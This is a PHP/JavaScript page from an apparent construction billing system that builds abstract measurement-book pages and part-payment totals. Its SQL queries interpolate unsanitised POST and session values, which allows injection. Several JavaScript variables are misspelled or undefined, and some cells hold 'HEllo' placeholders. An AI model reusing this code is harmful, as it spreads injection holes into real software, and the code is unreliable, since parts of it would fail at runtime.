<?php
//session_start();
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php'; 
require_once 'library/binddata.php';
checkUser();
include "library/common.php";
$msg = ''; $Line = 0;
function dt_display($ddmmyyyy)
{
 $dt=explode('-',$ddmmyyyy); 
 $dd=$dt[2];
 $mm=$dt[1];
 $yy=$dt[0];
 return $dd . '/' . $mm . '/' . $yy;
}
function checkPartpayment($DpmArrMbidList,$Key)
{
	$InitKey = $Key;
	while($perc = current($DpmArrMbidList)) 
	{
		if ($perc == $InitKey) 
		{
			//echo key($DpmArrPayPercentList).'<br />';
			$res .= key($DpmArrMbidList)."*";
		}
		next($DpmArrMbidList);
	}
	return rtrim($res,"*");
}

function removeArray($res,$array)
{
	$explodeRes = explode("*",rtrim($res,"*"));
	for($i=0; $i<count($explodeRes);$i++)
	{
		$RemKey = $explodeRes[$i];
		unset($array[$RemKey]);
	}
	return $array;
}
function CheckPageBreak($tablehead,$abstmbno,$table,$page)
{
	$nextpage = $page+1;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>C/o Page No ".$nextpage."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	$Output .=  "<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page ".$page."</td></tr>";
	$Output .= "</table>";
	$Output .= "<p  style='page-break-after:always;'></p>";
	$Output .= '<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
				<tr style="border:none;"><td align="right" style="border:none;">Abstract M.Book No. '.$abstmbno.'&nbsp;&nbsp;</td></tr>
				</table>';
	$Output .= $table;
	$Output .= "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
	$Output .= $tablehead;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>B/f from Page No ".$page."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	echo $Output;
}

function UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page)
{
	$update_pageno_sql = "update measurementbook_temp set abstmbookno = '$abstmbno', abstmbpage = '$page' where sheetid	= '$abstsheetid' AND subdivid = '$subdivid'";
	$update_pageno_query = mysql_query($update_pageno_sql);
}
$staffid 		= 	$_SESSION['sid'];
$userid 		= 	$_SESSION['userid'];
$rbn    		= 	$_SESSION["rbn"]; 
$abstsheetid    = 	$_SESSION["abstsheetid"];   $abstmbno 	= 	$_SESSION["abs_mbno"];  $abstmbpage  	= 	$_SESSION["abs_page"];	
$fromdate       = 	$_SESSION['fromdate'];      $todate   	= 	$_SESSION['todate'];    $abs_mbno_id 	= 	$_SESSION["abs_mbno_id"];
$paymentpercent = 	$_SESSION["paymentpercent"];
$oldabstmbno 	=	$abstmbno;
$oldabstmbpage 	=	$abstmbpage;

if($_POST["Submit"] == "Submit")
{	

	$max_page_abs 			= 	$_POST['txt_maxpage'];
	$abstmbno 				= 	$_POST['txt_abstmbno'];
	//$mbook_start_page_abs 	= 	get_mbook_startpage($abstmbno,$abstsheetid);
	//$start_page_abs 		= 	explode('*', $mbook_start_page_abs);
	//$insert_mybmook_sql_3 	= 	"insert into mymbook set allotmentid = '$start_page_abs[1]', mbno = '$abstmbno', startpage = '$start_page_abs[0]', endpage = '$max_page_abs', sheetid = '$abstsheetid', staffid = '$staffid', rbn = '$rbn', active = 0, flag = 'A'";
	//$insert_mybmook_query_3 = 	mysql_query($insert_mybmook_sql_3);
	$update_asb_maxpage 	= 	"update mbookallotment set mbpage = '$max_page_abs' WHERE allotmentid	= '$abs_mbno_id' AND sheetid = '$abstsheetid'";
	$update_asb_maxpage_sql = 	mysql_query($update_asb_maxpage);
	$oldmbook_query 		= 	"SELECT * from oldmbook WHERE sheetid = '$abstsheetid'";
	$oldmbook_sql 			= 	mysql_query($oldmbook_query);
	if(mysql_num_rows($oldmbook_sql)>0)
	{
		while($res = mysql_fetch_array($oldmbook_sql))
		{
			$mbno 								= 	$res['mbname'];
			$mbooktype 							= 	$res['mbook_type'];
			$update_mbookallot_query 			= 	"UPDATE mbookallotment set active = '0' WHERE sheetid = '$abstsheetid' AND staffid = '$staffid' AND allotmentid = '".$res['old_id']."'";
			$update_mbookallot_sql 	 			= 	mysql_query($update_mbookallot_query);
			$update_aggreement_mbookallot_query = 	"UPDATE agreementmbookallotment set active = '0' WHERE sheetid = '$abstsheetid' AND allotmentid = '".$res['old_id']."'";
			$update_aggreement_mbookallot_sql 	= 	mysql_query($update_aggreement_mbookallot_query); 
			$oldmbook  		   				   .= 	$res['mbname']."*"; 
			//$mbook_start_page_old 				= 	get_mbook_startpage($mbno,$abstsheetid);
			//$start_page_old 					= 	explode('*', $mbook_start_page_old);
			//$insert_mybmook_sql 				= 	"insert into mymbook set allotmentid = '$start_page_old[1]', mbno = '$mbno', startpage = '$start_page_old[0]', endpage = '100', sheetid = '$abstsheetid', staffid = '$staffid', rbn = '$rbn', active = 0, flag = '$mbooktype'";	
			//$insert_mybmook_query 				= 	mysql_query($insert_mybmook_sql);
		} 
	} 
    $currentquantity 			= 	trim($_POST['currentquantity']);
	$mbookquery					=	"INSERT INTO measurementbook  (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbnopages, mbpage, mbremainpage, mbtotalpages, mbquantity, mbtotal, abstmbookno, abstmbpage, abstquantity, absttotal, pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill, remarks) SELECT  now(), staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbnopages, mbpage, mbremainpage, mbtotalpages, mbquantity, mbtotal, abstmbookno, abstmbpage, abstquantity, absttotal, pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill, remarks FROM measurementbook_temp WHERE sheetid = '$abstsheetid'";// WHERE flag =1 OR flag = 2";
   	$mbooksql 					= 	mysql_query($mbookquery);   
    $sheetquery 				= 	"UPDATE sheet SET rbn = '$runn_acc_bill_no' WHERE sheet_id ='$abstsheetid'";//AND STAFFID
    $sheetsql 					= 	dbQuery($sheetquery);
	$mbookpage_query 			= 	"select distinct mbno from mbookgenerate a WHERE NOT EXISTS(select mbname from oldmbook b WHERE a.mbno = b.mbname AND b.sheetid = '$abstsheetid') AND a.sheetid = '$abstsheetid'";
	$mbookpage_sql 				= 	mysql_query($mbookpage_query);
	while($result3 = mysql_fetch_array($mbookpage_sql))
	{
		$mbno 					= 	$result3['mbno'];
		$selectmaxpage_query 	= "select max(mbpage) from mbookgenerate WHERE sheetid	= '$abstsheetid' AND mbno ='".$result3['mbno']."'";
		$selectmaxpage_sql 		= 	mysql_query($selectmaxpage_query);
		$mbookmaxpage 			= 	@mysql_result($selectmaxpage_sql,'mbpage');
		//$mbook_start_page 		= 	get_mbook_startpage($mbno,$abstsheetid);
		//$strat_page 			= 	explode('*', $mbook_start_page);
		//$insert_mybmook_sql_2 	= 	"insert into mymbook set allotmentid = '$strat_page[1]', mbno = '$mbno', startpage = '$strat_page[0]', endpage = '$mbookmaxpage', sheetid = '$abstsheetid', staffid = '$staffid', rbn = '$rbn', active = 1, flag = '$mbooktype'";
		//$insert_mybmook_query_2 = 	mysql_query($insert_mybmook_sql_2);
		$upademaxpage_query 	= 	"update mbookallotment set mbpage = '$mbookmaxpage' WHERE sheetid = '$abstsheetid' AND mbno ='".$result3['mbno']."'";
		$upademaxpage_sql 		= 	mysql_query($upademaxpage_query);
	}
	$newmbooksql 				= 	"DELETE FROM oldmbook WHERE sheetid = '$abstsheetid'";// DELETE NEW MBOOK TABLE
	$result1 					= 	dbQuery($newmbooksql);
	$mbookgeneratedelsql		= 	"DELETE FROM mbookgenerate WHERE sheetid ='$abstsheetid'"; //DELETE MBOOK GENERATE TABLE
    $result2 					= 	dbQuery($mbookgeneratedelsql);
	$mbooktempdelsql 			= 	"DELETE FROM measurementbook_temp WHERE sheetid ='$abstsheetid'"; //DELETE MBOOK TEMP TABLE
    $result3 					= 	dbQuery($mbooktempdelsql);
	if($is_finalbill == "Y")
	{
		$deactivate_sheet_query = 	"update sheet set active = '0' WHERE sheet_id = '$abstsheetid'";
		$deactivate_sheet_sql 	= 	mysql_query($deactivate_sheet_query);
	}
	//header('Location: AbsGenerate_Partpay.php');
}


// Commented on 29.12.2016 by Prabasingh for Double time stored in mesaurement book table

/*$checkPartpay_sql 	= 	"select * from measurementbook_temp where sheetid = '$abstsheetid'";
$checkPartpay_query = 	mysql_query($checkPartpay_sql);
if(mysql_num_rows($checkPartpay_query)>0)
{
	$check = 1;
}
else
{
	$check = 0;
	$insermbook_temp_sql 	= 	"INSERT INTO measurementbook_temp (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill)
SELECT mbgeneratedate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  '100', flag, 0, rbn, active, userid, is_finalbill FROM mbookgenerate where mbookgenerate.sheetid = '$abstsheetid'";
$insermbook_temp_query 		= 	mysql_query($insermbook_temp_sql);
}*/


$query 		= 	"SELECT    sheet_id, sheet_name, work_order_no, work_name, short_name, tech_sanction, computer_code_no, name_contractor, agree_no, rbn, rebate_percent FROM sheet WHERE sheet_id ='$abstsheetid' ";
$sqlquery 	= 	mysql_query($query);
if ($sqlquery == true) 
{
    $List 					= 	mysql_fetch_object($sqlquery);
    $work_name 				= 	$List->work_name; 
	$short_name 			= 	$List->short_name;   
	$tech_sanction 			= 	$List->tech_sanction;  
    $name_contractor 		= 	$List->name_contractor;   
	$ccno 					= 	$List->computer_code_no;  
	$agree_no 				= 	$List->agree_no; 
	$overall_rebate_perc 	= 	$List->rebate_percent; 
	$runn_acc_bill_no 		= 	$rbn;
	$work_order_no 			= 	$List->work_order_no; /*   if($List->rbn == 0){$runn_acc_bill_no =1;  } else { $runn_acc_bill_no=$List->rbn +1;}*/
	$length1 				= 	strlen($work_name);
 	$start_line1 			= 	ceil($length1/70); 
	$length2 				= 	strlen($agree_no);
	$start_line2 			= 	ceil($length2/27);  
	$LineIncr 				= 	$start_line1 + $start_line2 + 2 + 2; 
}
$Line = $Line + $LineIncr;
//echo $LineIncr;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Abstrack MBook</title>
    <link rel="stylesheet" href="script/font.css" />
</head>
	<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
	<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
	<link rel="stylesheet" href="css/button_style.css"></link>
	<link rel="stylesheet" href="js/jquery-ui.css">
	<script src="js/jquery-1.10.2.js"></script>
	<script src="js/jquery-ui.js"></script>
	<link rel="stylesheet" href="/resources/demos/style.css">
	<link rel="stylesheet" href="Font style/font.css" />
	<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
	<script type='text/javascript' src='js/basic_model_jquery.js'></script>
	<script type='text/javascript' src='js/jquery.simplemodal.js'></script>
	<link rel="stylesheet" href="css/font-awesome.css" />
	<!--<script type='text/javascript' src='js/basic.js'></script>-->
	<script src="dist/sweetalert-dev.js"></script>
	<link rel="stylesheet" href="dist/sweetalert.css">
<script type="text/javascript" language="javascript">
	function goBack()
	{
		url = "AbsGenerate_Partpay.php";
		window.location.replace(url);
	}
	function ValidatePercent(obj,section,idcount)
	{
		//alert(idcount);
		var value = obj.value;
		if(Number(value)>100)
		{
			swal("", "Entered % should be less than 100..!", "error"); 
			obj.value = "";
			document.getElementById("hid_slm_result"+idcount).value = "";
			totalAmountCalculation("slm");
			return false;
		}
		if(section == "dpm")
		{
			var paid_percent_dpm = document.getElementById("txt_partpay_percent_dpm"+idcount).value;
			var remain_percent_dpm = 100-Number(paid_percent_dpm);
			if(value > remain_percent_dpm)
			{
				swal("Entered Percentage should be less than: ", remain_percent_dpm+" %", "error");
				obj.value = "";
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
				totalAmountCalculation("dpm");
				return false;
			}
		}
	}
	function ValidateSlm()
	{
		var slmqty = document.getElementById("hid_slm_qty").value;
		var qty = 0;
		$('input[name="txt_partpay_qty_slm[]"]').each(function() {
			var currentqty = $(this).val();
			qty = (Number(qty)+Number(currentqty));
			if(qty>slmqty)
			{
				swal("", "Quantity Not Allowed..:)", "error"); 
				//$(this).val() = "";
				//return false;    updated on 03.11.2016
			}
		});
	}
	function setRowSpan() 
	{
		var i;
		var rowcount =  document.getElementById("table_group_count").value;
		for(i=0; i<rowcount; i++)
		{
			var row_span = document.getElementById("row_count"+i).value;
			document.getElementById("td_popupbutton"+i).rowSpan = row_span;
			var ht = document.getElementById("td_popupbutton"+i);
			 var checkbox_height = ht.offsetHeight;
			 //document.getElementById('ch_item'+i).offsetHeight = checkbox_height;
			 document.getElementById("ch_item"+i).style.height = checkbox_height+"px";
			 //document.getElementById("ch_item"+i).style.width = checkbox_height+"px";
			
		}
	}
	//var index = 1;
	function addRow()
	{
		var x = Number(document.getElementById("table4").rows.length);
		 	 index = x;
		//var arg = "X"+"*"+index;
		var rate = document.getElementById("txt_item_rate_slm0").value;
		var table=document.getElementById("table4");
        var row=table.insertRow(table.rows.length-2);
        	row.id = "rowid"+index;
			row.style.align = "center";
			
		var cell1=row.insertCell(0);
			cell1.setAttribute('class', "dynamicrowcell");
			cell1.style.padding = "0px 0px 0px 0px";
				
		var txt_box1 = document.createElement("input");
			txt_box1.name = "txt_partpay_qty_slm[]";
            txt_box1.id = "txt_partpay_qty_slm"+index;
			//txt_box1.value = row.id;
			txt_box1.style.width = 93+"px";
			txt_box1.style.border = "1px solid #2aade4";
			txt_box1.style.textAlign = "right";
			txt_box1.setAttribute('class', "dynamictextbox"); 
            cell1.appendChild(txt_box1);
			/*txt_box1.onblur= function () {
								ValidateSlm();
                        	  calculateAmount(this,index,"qty","slm")
                    		}*/
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm")
												ValidateSlm();
												};
											})(index); 
		var cell2=row.insertCell(1);
			cell2.setAttribute('class', "dynamicrowcell");	
			cell2.style.padding = "0px 0px 0px 0px";
		var txt_box2 = document.createElement("input");
			txt_box2.name = "txt_item_rate_slm";
            txt_box2.id = "txt_item_rate_slm"+index;
			txt_box2.value = Number(rate).toFixed(2);
			txt_box2.style.textAlign = "right";
			txt_box2.style.width = 80+"px";
			//txt_box2.readOnly = true;
			txt_box2.setAttribute('class', "dynamictextbox"); 
            cell2.appendChild(txt_box2);
			/*txt_box2.onblur= function () {
                        	  calculateAmount(this,index,"rate","slm")
                    		}*/
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm")
												ValidateSlm();
												};
											})(index); 
		var cell3=row.insertCell(2);
			cell3.setAttribute('class', "dynamicrowcell");	
			cell3.style.padding = "0px 0px 0px 0px";
		var txt_box3 = document.createElement("input");
			txt_box3.name = "txt_partpay_percent_slm";
            txt_box3.id = "txt_partpay_percent_slm"+index;
			//txt_box3.value = txt_box3.id;
			txt_box3.style.width = 40+"px";
			txt_box3.style.textAlign = "right";
			txt_box3.style.border = "1px solid #2aade4";
			txt_box3.setAttribute('class', "dynamictextbox"); 
			/*txt_box3.onblur= function () {
                        	  calculateAmount(this,index,"percent","slm");
							  ValidatePercent(this)
                    		}*/
							txt_box3.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm")
												ValidatePercent(this,"slm",ind);
												};
											})(index);
            cell3.appendChild(txt_box3);
							
		var cell4=row.insertCell(3);
			cell4.setAttribute('class', "dynamicrowcell");	
			cell4.style.padding = "0px 0px 0px 0px";
		var txt_box4 = document.createElement("input");
			txt_box4.name = "txt_partpay_amt_slm[]";
            txt_box4.id = "txt_partpay_amt_slm"+index;
			txt_box4.style.width = 130+"px";
			txt_box4.style.textAlign = "right";
			txt_box4.style.pointerEvents = "none";
			txt_box4.setAttribute('class', "dynamictextbox"); 
            cell4.appendChild(txt_box4);
		
		var cell5=row.insertCell(4);
			//cell5.style.width = 10+"px";
			cell5.style.textAlign = "center";
			cell5.style.padding = "0px 0px 0px 0px";
        var delbtn=document.createElement("input");
        	delbtn.type = "button";
        	delbtn.value = " X ";
        	delbtn.id = "btn_delete"+index;
			delbtn.name = "btn_delete";
			delbtn.setAttribute('class', "delbtnstyle");
			delbtn.style.width = 32+"px";
			delbtn.style.borderRadius = 0+"px";
        	delbtn.onclick = function () {
                        	  deleteRow(this);
                    		}
        	cell5.appendChild(delbtn);
			
			//var cell6=row.insertCell(5);
			//cell5.style.width = 10+"px";
			//cell6.style.textAlign = "center";
			//cell6.style.padding = "0px 0px 0px 0px";
			//cell6style.visibility = "hidden";	
			
	// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
		var txt_box5 = document.createElement("input");
        	txt_box5.type = "hidden";
        	txt_box5.id = "hid_slm_result"+index;
			txt_box5.name = "hid_slm_result[]";
			txt_box5.setAttribute('class', "dynamictextbox");
			txt_box5.style.width = 70+"px";
			txt_box5.style.borderRadius = 0+"px";
			cell5.appendChild(txt_box5);
			index++;
	}
	function deleteRow(obj) 
	{
	   //var row = document.getElementById(id);
	   //row.parentNode.removeChild(row);
	   /*$('input[name = "btn_delete"]').click(function(){
		   $(this).closest('tr').remove()
		})*/
		var tr = $(obj).closest('tr');
		tr.remove();
	   totalAmountCalculation("slm");
	   return true;
	}
	function calculateAmount(obj,id,type,section)
	{
		var idcount = id;
		var currentvalue = obj.value;
		var itemid = document.getElementById("txt_item_id").value;
		var currentrbn = document.getElementById("txt_rab_no").value;
		if(section == "slm")
		{
			if(type == "qty")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var qty = currentvalue;
				//alert(percent)
			}
			if(type == "rate")
			{
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var rate = currentvalue;
			}
			if(type == "percent")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = currentvalue;
			}
			qty = Number(qty);
			//alert(qty)
			rate = Number(rate);
			//alert(rate)
			percent = Number(percent);
			//alert(percent)
			if((qty != "") && (rate != "") && (percent != ""))
			{
				var amount = qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
			}
			else
			{
				// Added on 03.02.2017 for 0% payment for SLM item
				var amount = 0;//qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = 0;//Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
				//document.getElementById("txt_partpay_amt_slm"+idcount).value = "";
				//document.getElementById("hid_slm_result"+idcount).value = "";
			}
		}
		if(section == "dpm")
		{
			var rate_dpm 	= document.getElementById("txt_item_rate_dpm"+idcount).value;
			var qty_dpm 	= document.getElementById("txt_partpay_qty_dpm"+idcount).value;
			var rbn_dpm 	= document.getElementById("txt_rbn_dpm"+idcount).value;
			var mbid_dpm 	= document.getElementById("hid_dpm_mbid"+idcount).value;
			var percent_dpm = currentvalue;
				qty_dpm 	= Number(qty_dpm);
				rate_dpm 	= Number(rate_dpm);
				percent_dpm = Number(percent_dpm);
			if((qty_dpm != "") && (rate_dpm != "") && (percent_dpm != ""))
			{
				var amount_dpm = qty_dpm * rate_dpm * percent_dpm / 100;
				document.getElementById("txt_amt_dpm_payable"+idcount).value = Number(amount_dpm).toFixed(2);
				var result = percent_dpm + "*" + currentrbn + "*" + qty_dpm + "*" + itemid + "*" + rbn_dpm + "*" + mbid_dpm;
				//alert(result)
				document.getElementById("hid_dpm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
			}
		}
		totalAmountCalculation(section);
		
		return true;
	}
	
	function totalAmountCalculation(section)
	{
		var amount = 0;
		if(section == "slm")
		{
			$('input[name="txt_partpay_amt_slm[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
			//if(DpmPayableAmount == ""){ DpmPayableAmount = 0; }
			var OverAllAmount = Number(amount)+Number(DpmPayableAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_amt_slm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_amt_slm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
		if(section == "dpm")
		{
			$('input[name="txt_amt_dpm_payable[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
			//if(SlmTotalAmount == ""){ SlmTotalAmount = 0; }
			var OverAllAmount = Number(amount)+Number(SlmTotalAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
	}
	
	function getDPMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp;
		var data;
		var i, rbn, qty, percent, measurementbookid, searchflag, RemarkData ="", newrow = "",TotalPaidDpmAmount = 0,TotalPayableDpmAmount = 0; 
		var currentrbn = document.getElementById("txt_rab_no").value;
		var rate = Number(rate);	
		var dpmitemQty = document.getElementById("hid_dpm_qty").value;
		if(Number(dpmitemQty) == 0)
		{
			document.getElementById("dpmheadrow1").className 	= "hide";
			document.getElementById("dpmheadrow2").className 	= "hide";
			document.getElementById("dpmtotalrow").className 	= "hide";
			document.getElementById("dpmremarksrow").className 	= "hide";
		}
		else
		{
			document.getElementById("dpmheadrow1").className 	= "";
			document.getElementById("dpmheadrow2").className 	= "";
			document.getElementById("dpmtotalrow").className	= "";
			document.getElementById("dpmremarksrow").className 	= "";
		}
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_dpm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText;
				if(data != "")
				{
					var details = data.split("*");
					var index = 1;
					for(i=0; i<details.length; i+=6)
					{
						RemarkData = ""; 
						rbn 				= details[i];
						qty 				= details[i+1];
						percent 			= details[i+2];
						measurementbookid 	= details[i+3];
						searchflag 			= details[i+4];
						PayableDpmSlmPercent 		= details[i+5];
						if((PayableDpmSlmPercent != "") && (PayableDpmSlmPercent != "X"))
						{
							var PayableSlmDpmAmt = Number(qty)*Number(PayableDpmSlmPercent)*Number(rate)/100;
								TotalPayableDpmAmount = (Number(TotalPayableDpmiAmount)+Number(PayableSlmDpmAmt));
							var result = PayableDpmSlmPercent + "*" + currentrbn + "*" + qty + "*" + itemid + "*" + rbn + "*" + measurementbookid;
						}
						else
						{
							var PayableSlmDpmAmt = 0;
							var result = "";
						}
						//alert(searchflag)
						
						
						if((searchflag != "") && (searchflag != "X"))
						{
							var searchflagdetails = searchflag.split("@");
							
								RemarkData  = "<table style='color:blue;font-family:verdana;font-size:13px;' class='table1' align='center' width='80%' bgcolor=''>";
								RemarkData += "<tr height='30px' style='color:white;font-family:verdana;font-size:13px;background-color:#078c9b;'><td colspan = '3'>Quantity : "+qty+"</td></tr>";
								RemarkData += "<tr height='27px' style='color:white;font-family:verdana;font-size:13px;background-color:#a5b23c;'><td>RBN No.</td><td>Date</td><td>Paid Percent ( % )</td></tr>";
								for(j=0; j<searchflagdetails.length; j+=3)
								{
									remarkPercent 	= searchflagdetaiils[j+0];
									remarkRbn 		= searchflagdetaiils[j+1];
									remarkDate 		= searchflagdetaiils[j+2];
									
									if((remarkPercent != "") && (remarkPercent != "X"))
									{
										//alert(remarkPercent)
										//alert(remarkRbn)
										RemarkData += "<tr id='trid"+j+"'><td>"+remarkRbn+"</td><td>"+remarkDate+"</td><td>"+remarkPercent+"</td></tr>";
									}
								}
								RemarkData += "</table>";
						}
						//var rate = document.getElementById("txt_item_rate_slm0").value;
						var amount = Number(qty)*Number(percent)*Number(rate)/100;
						 	TotalPaidDpmAmount = (Number(TotalPaidDpmAmount)+Number(amount));
						var table = document.getElementById("table3");
						var row = table.insertRow(table.rows.length-2);
							row.id = "rowid_dpm"+index;
							row.style.align = "center";
							
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "");
							cell1.style.textAlign = "center";	
							cell1.style.padding = "0px 0px 0px 0px";
						if(searchflag == "X")
						{	
							var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
						}
						else
						{
							var txt_box1 = document.createElement("input");
							txt_box1.type = "hidden";
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							
							var srch_btn1 = document.createElement("input");
							srch_btn1.type = "image";
							srch_btn1.name = "srch_btn_dpm";
							srch_btn1.style.textAlign = "center";
							srch_btn1.id = "srch_btn_dpm"+index;
							srch_btn1.src = "images/search (10).png";
							srch_btn1.style.width = 25+"px";
							srch_btn1.style.height = 20+"px";
							
							var txt_remarkdata_dpm_1 = document.createElement("input");
								txt_remarkdata_dpm_1.type = "hidden";
								txt_remarkdata_dpm_1.id = "hid_dpm_remarkdata"+index;
								txt_remarkdata_dpm_1.name = "hid_dpm_remarkdata[]";
								txt_remarkdata_dpm_1.value = RemarkData;
								txt_remarkdata_dpm_1.setAttribute('class', "dynamictextbox");
								txt_remarkdata_dpm_1.style.width = 70+"px";
								txt_remarkdata_dpm_1.style.borderRadius = 0+"px";
								cell1.appendChild(txt_remarkdata1_dpm_1);
							
							//srch_btn1.style.textAlign = "center";
							//srch_btn1.style.pointerEvents = "none";
							//srch_btn1.setAttribute('class', "dynamictextbox"); 
							/*txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index);*/
							cell1.appendChild(srch_btn1);
							srch_btn1.onclick = (function (ind) {
												return function() {
												  ShowRemarks(ind1)
												  };
												})(index);
							/*srch_btn1.onclick = function () {
												  ShowRemarks(RemarkData)
												}*/
						}
								
							
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_partpay_qty_dpm";
							txt_box2.id = "txt_partpay_qty_dpm"+index;
							txt_box2.value = Number(qty).toFixed(3);
							txt_box2.style.width = 90+"px";
							txt_box2.style.textAlign = "right";
							txt_box2.style.pointerEvents = "none";
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_item_rate_dpm";
							txt_box3.id = "txt_item_rate_dpm1"+index;
							txt_box3.value = Number(rate).toFixed(2);
							txt_box3.style.width = 80+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.pointerEvents = "none";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_percent_dpm";
							txt_box4.id = "txt_partpay_percent_dpm1"+index;
							txt_box4.value = Number(percent);
							txt_box4.style.width = 35+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						var cell5=row.insertCell(4);
